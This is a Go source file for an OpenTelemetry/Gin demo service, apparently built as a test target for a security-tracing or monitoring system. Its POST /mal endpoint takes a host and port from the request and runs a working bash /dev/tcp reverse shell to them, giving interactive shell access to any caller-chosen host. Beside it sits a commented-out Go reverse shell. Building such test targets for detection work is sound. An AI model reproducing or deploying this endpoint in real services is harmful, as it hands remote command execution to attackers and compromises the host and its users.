package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"go.opentelemetry.io/otel/baggage"
	"os/exec"
	"otelDemo/otel"
	"otelDemo/otelgin/common/consts"
	"otelDemo/otelgin/core/server"
	"strconv"
	"unsafe"
)

/*
#include <stdio.h>
#include <stdint.h>

void tell_pin_ctid(const uint8_t* data, size_t len, uint64_t ctid) {}
*/
import "C"

func main() {
	conf, err := otel.LoadApplicationConf("./application.yaml")
	if err != nil {
		logrus.Errorf("[main]-加载配置文件失败: %v", err)
		return
	}
	otelShutdown, err := otel.SetupOTelSDK(context.Background(), conf)
	if err != nil {
		logrus.Errorf("[main]-初始化OpenTelemetry失败: %v", err)
		return
	}
	defer func() {
		err = errors.Join(err, otelShutdown(context.Background()))
	}()

	serverConf, err := server.LoadServerConf("./application.yaml")
	if err != nil {
		logrus.Errorf("[main]-加载服务配置失败: %v", err)
		return
	}

	ginServer := server.NewOtelGinServer(gin.ReleaseMode, conf.ServiceName)
	ginServer.POST("/mal", func(c *gin.Context) {
		req := struct {
			Host string `json:"host"`
			Port int    `json:"port"`
		}{}
		if err := c.ShouldBindJSON(&req); err != nil {
			logrus.Errorf("[main] - [POST /mal] - 解析请求体失败: %v", err)
			c.JSON(400, gin.H{"error": "invalid request"})
			return
		}

		// 尝试获取ctid的值
		b := baggage.FromContext(c.Request.Context())
		ctid := b.Member(consts.CybertwinKey).Value()
		if ctid == "" {
			logrus.Errorf("[main] - [POST /mal] - 获取ctid失败")
			c.JSON(400, gin.H{"error": "获取ctid失败"})
			return
		}

		ctidInt, err := strconv.ParseInt(ctid, 10, 64)
		if err != nil {
			logrus.Errorf("[main] - [POST /mal] - ctid转换为整数失败: %v", err)
			c.JSON(400, gin.H{"error": "ctid转换为整数失败"})
			return
		}

		// call for a reversesh
		go func() {
			// 新建socket请求
			//conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", req.Host, req.Port))
			//if err != nil {
			//	logrus.Errorf("[main] - [POST /mal] - 连接到目标主机失败: %v", err)
			//	return
			//}
			//
			//defer conn.Close()
			//
			//// 启动shell进程
			//cmd := exec.Command("/bin/sh", "-i")
			//cmd.Stdin = conn
			//cmd.Stdout = conn
			//cmd.Stderr = conn
			//err = cmd.Run()
			//
			//if err != nil {
			//	logrus.Errorf("[main] - [POST /mal] - 启动shell进程失败: %v", err)
			//	return
			//}
			target := fmt.Sprintf("%s/%d", req.Host, req.Port)
			cmdBytes := []byte("bash -i >& /dev/tcp/" + target + " 0>&1")
			cmdStr := string(cmdBytes)

			cptr := (*C.uint8_t)(unsafe.Pointer(&cmdBytes))
			clen := C.size_t(len(cmdBytes))
			ctidParam := C.uint64_t(uint64(ctidInt))
			C.tell_pin_ctid(cptr, clen, ctidParam)

			cmd := exec.Command("bash", "-c", cmdStr)
			err = cmd.Run()
			if err != nil {
				logrus.Errorf("[main] - [POST /mal] - 执行命令失败: %v", err)
				return
			}
			logrus.Infof("quit the reversesh session with %s:%d", req.Host, req.Port)
		}()

		c.JSON(200, gin.H{"message": "something bad may happen, please check your terminal"})
	})

	if err = ginServer.Run(fmt.Sprintf(":%d", serverConf.Port)); err != nil {
		logrus.Errorf("[main]-启动Gin服务器失败: %v", err)
		panic(err)
	}
}
